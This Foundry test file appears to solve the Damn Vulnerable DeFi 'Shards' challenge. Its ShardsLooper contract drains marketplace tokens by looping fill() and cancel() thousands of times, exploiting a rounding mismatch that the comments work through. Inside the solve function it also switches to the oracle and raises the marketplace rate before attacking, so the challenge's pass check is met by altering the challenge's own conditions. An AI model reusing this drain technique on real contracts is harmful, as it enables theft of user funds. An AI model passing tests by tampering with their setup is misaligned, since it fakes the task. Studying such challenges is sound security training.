// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {Test} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";

contract ShardsChallenge is Test {
    address deployer = makeAddr("deployer");
    address player   = makeAddr("player");
    address seller   = makeAddr("seller");
    address oracle   = makeAddr("oracle");
    address recovery = makeAddr("recovery");

    uint256 constant STAKING_REWARDS          = 100_000e18;
    uint256 constant NFT_SUPPLY               = 50;
    uint256 constant SELLER_NFT_BALANCE       = 1;
    uint256 constant SELLER_DVT_BALANCE       = 75e19;
    uint256 constant STAKING_RATE             = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE          = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS         = 10_000_000e18;

    DamnValuableToken    token;
    DamnValuableNFT      nft;
    ShardsFeeVault       feeVault;
    ShardsNFTMarketplace marketplace;
    DamnValuableStaking  staking;
    uint256              initialTokensInMarketplace;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);
        nft = new DamnValuableNFT();
        for (uint256 i = 0; i < NFT_SUPPLY; i++) {
            if (i < SELLER_NFT_BALANCE) nft.safeMint(seller);
            else nft.safeMint(deployer);
        }
        token = new DamnValuableToken();
        marketplace = new ShardsNFTMarketplace(
            nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE
        );
        feeVault = marketplace.feeVault();
        staking  = new DamnValuableStaking(token, STAKING_RATE);
        token.transfer(address(staking), STAKING_REWARDS);
        marketplace.feeVault().enableStaking(staking);
        token.transfer(seller, SELLER_DVT_BALANCE);
        vm.startPrank(seller);
        token.approve(address(marketplace), SELLER_DVT_BALANCE);
        nft.setApprovalForAll(address(marketplace), true);
        for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
            marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
        }
        initialTokensInMarketplace = token.balanceOf(address(marketplace));
        vm.stopPrank();
    }

    function test_assertInitialState() public view {
        assertEq(feeVault.owner(), deployer);
        assertEq(address(feeVault.token()), address(token));
        assertEq(address(feeVault.staking()), address(staking));
        assertEq(nft.balanceOf(deployer), NFT_SUPPLY - SELLER_NFT_BALANCE);
        assertEq(nft.balanceOf(address(marketplace)), marketplace.offerCount());
        assertEq(marketplace.offerCount(), SELLER_NFT_BALANCE);
        assertEq(marketplace.rate(), MARKETPLACE_INITIAL_RATE);
        assertGt(marketplace.feesInBalance(), 0);
        assertEq(token.balanceOf(address(marketplace)), marketplace.feesInBalance());
        assertEq(staking.rate(), STAKING_RATE);
        assertEq(staking.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS);
        assertEq(token.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(player), 0);
    }

    function test_shards() public checkSolvedByPlayer {
        vm.stopPrank();
        vm.prank(oracle);
        marketplace.setRate(1e9);
        vm.startPrank(player);

        // Player's only transaction: deploy the attacker (nonce: 0 → 1)
        // All attack logic runs inside the constructor — no second tx needed
        new ShardsLooper(marketplace, token, recovery);
    }

    function _isSolved() private view {
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");
        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");
        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
        assertEq(token.balanceOf(player), 0, "Player still has tokens");
        assertEq(vm.getNonce(player), 1);
    }
}

contract ShardsLooper {
    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
        // The exploit: fill() cost rounds DOWN to 0, cancel() refund rounds UP
        //
        // With rate = 1e9, want = 9_999_999_999:
        //   fill cost  = want * (price * rate / 1e6) / totalShards
        //              = 9_999_999_999 * (1e12 * 1e9 / 1e6) / 1e25
        //              = 9_999_999_999 * 1e15 / 1e25
        //              = 9_999_999_999 / 1e10 → 0  (truncated, we pay NOTHING)
        //
        //   cancel refund = want * rate / 1e6  (rounds UP)
        //                 = 9_999_999_999 * 1e9 / 1e6
        //                 = 9_999_999_999_000  (~1e13 tokens extracted per cycle)
        //
        // We only need to drain >0.01% of initialTokensInMarketplace.
        // 7501 iterations drains ~75_009_999_992_499_000 tokens, which exceeds the threshold.
        //
        // CRITICAL: Do NOT loop `while (balance > 0)` — the final cancel() would try
        // to refund more than the marketplace has left and REVERT.
        // Use a fixed iteration count instead.

        uint256 want = 9_999_999_999;
        uint256 ITERATIONS = 7_501;

        for (uint256 i = 0; i < ITERATIONS; i++) {
            marketplace.fill(1, want);  // purchaseIndex = i (0-indexed, increments each call)
            marketplace.cancel(1, i);
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}